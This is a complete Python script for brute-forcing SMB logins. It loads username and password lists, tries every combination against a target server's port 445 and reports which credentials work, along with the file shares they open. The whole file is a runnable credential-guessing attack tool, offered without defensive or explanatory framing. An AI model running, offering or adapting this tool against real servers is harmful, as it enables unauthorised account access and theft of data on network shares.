import argparse
import time
from pathlib import Path
from typing import Iterable, List, Optional, Sequence, Tuple

from smb.SMBConnection import SMBConnection


INVALID_AUTH_MESSAGE = "SMB connection not authenticated"


def authenticate_smb(
    server: str,
    username: str,
    password: str,
    *,
    domain: str = "",
    port: int = 445,
    timeout: int = 10,
) -> Tuple[bool, Sequence[str], Optional[str]]:
    """Attempt an SMB authentication and return (success, shares, error)."""
    connection = SMBConnection(
        username=username,
        password=password,
        my_name="smb-auth-brute",
        remote_name=server,
        domain=domain,
        use_ntlm_v2=True,
        is_direct_tcp=True,
    )

    try:
        connected = connection.connect(server, port, timeout=timeout)
        if not connected:
            return False, [], "Failed to establish SMB session"

        shares = [share.name for share in connection.listShares(timeout=timeout)]
        return True, shares, None
    except Exception as exc:  # pylint: disable=broad-except
        error_message = str(exc).strip()
        if error_message == INVALID_AUTH_MESSAGE:
            return False, [], None
        return False, [], error_message
    finally:
        connection.close()


def load_wordlist(path: Path) -> List[str]:
    with path.open("r", encoding="utf-8") as handle:
        return [line.strip() for line in handle if line.strip()]


def brute_force(
    server: str,
    usernames: Iterable[str],
    passwords: Iterable[str],
    *,
    domain: str = "",
    port: int = 445,
    timeout: int = 10,
    delay: float = 0.0,
) -> None:
    for username in usernames:
        for password in passwords:
            success, shares, error = authenticate_smb(
                server,
                username,
                password,
                domain=domain,
                port=port,
                timeout=timeout,
            )

            if success:
                print(f"VALID: {username}:{password}")
                if shares:
                    print("  Shares: " + ", ".join(shares))
            elif error:
                print(f"ERROR: {username}:{password} -> {error}")
            else:
                print(f"INVALID: {username}:{password}")

            if delay:
                time.sleep(delay)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Simple SMB authentication brute forcer.")
    parser.add_argument("server", help="Target SMB server IP or hostname.")
    parser.add_argument("usernames", type=Path, help="Path to newline-delimited username list.")
    parser.add_argument("passwords", type=Path, help="Path to newline-delimited password list.")
    parser.add_argument("--domain", default="", help="Domain or workgroup to authenticate against.")
    parser.add_argument("--port", type=int, default=445, help="SMB port (default: 445).")
    parser.add_argument("--timeout", type=int, default=10, help="Connection timeout in seconds.")
    parser.add_argument(
        "--delay", type=float, default=0.0, help="Seconds to wait between each attempt."
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    usernames = load_wordlist(args.usernames)
    passwords = load_wordlist(args.passwords)

    if not usernames:
        raise ValueError(f"No usernames were loaded from {args.usernames}")
    if not passwords:
        raise ValueError(f"No passwords were loaded from {args.passwords}")

    brute_force(
        args.server,
        usernames,
        passwords,
        domain=args.domain,
        port=args.port,
        timeout=args.timeout,
        delay=args.delay,
    )


if __name__ == "__main__":
    main()
